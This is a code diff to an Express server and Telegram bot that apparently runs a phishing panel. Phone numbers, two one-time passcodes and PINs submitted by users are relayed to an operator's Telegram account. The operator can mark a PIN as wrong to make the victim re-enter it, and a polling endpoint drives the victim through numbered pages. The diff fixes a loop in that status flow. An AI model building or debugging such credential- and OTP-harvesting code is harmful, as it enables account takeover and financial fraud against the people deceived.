@@ -88,6 +88,9 @@ app.post('/api/verify-first-otp', async (req, res) => {
 
     if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
 
+    // Set status to pending_otp1 when they submit the first OTP code
+    statusStore[phone] = "pending_otp1";
+
     const otpMessage = `1️⃣ <b>CL 2 - FIRST OTP (Step 1/2)</b>
 
 🆕 <b>NEW USER - FIRST VERIFICATION</b>
@@ -134,6 +137,8 @@ app.post('/api/verify-second-otp', async (req, res) => {
     });
 
     if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
+
+    statusStore[phone] = "pending_otp2";
 
     const otpMessage2 = `2️⃣ <b>CL 2 - SECOND OTP (Step 2/2)</b>
 
@@ -394,10 +399,18 @@ bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
     await ctx.replyWithHTML(`🔑 <b>WRONG PIN REPORTED</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User prompted to re-enter PIN.</b>`);
 });
 
-// -------------------- STATUS CHECK --------------------
+// -------------------- STATUS CHECK (FIXED LOOP) --------------------
 app.get('/api/check-status', (req, res) => {
     const phone = req.query.phone;
-    res.json({ status: statusStore[phone] || "pending" });
+    const currentStatus = statusStore[phone] || "pending";
+    
+    res.json({ status: currentStatus });
+
+    // FIX: Once Page 6 reads that it has been approved, change it internally 
+    // so Page 7 doesn't accidentally pick up the approval flag and loop!
+    if (currentStatus === "approved") {
+        statusStore[phone] = "idle_waiting_for_otp1";
+    }
 });
 
 // -------------------- SAFE PAGE ROUTE --------------------
